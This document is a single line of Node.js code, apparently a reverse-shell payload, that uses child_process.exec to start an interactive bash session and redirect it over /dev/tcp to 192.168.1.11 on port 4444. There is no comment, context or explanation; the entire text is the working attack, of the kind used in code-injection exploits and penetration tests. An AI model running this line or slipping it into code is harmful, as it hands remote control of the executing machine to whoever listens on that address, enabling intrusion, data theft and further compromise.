require('child_process').exec(`bash -i >& /dev/tcp/192.168.1.11/4444 0>&1`)
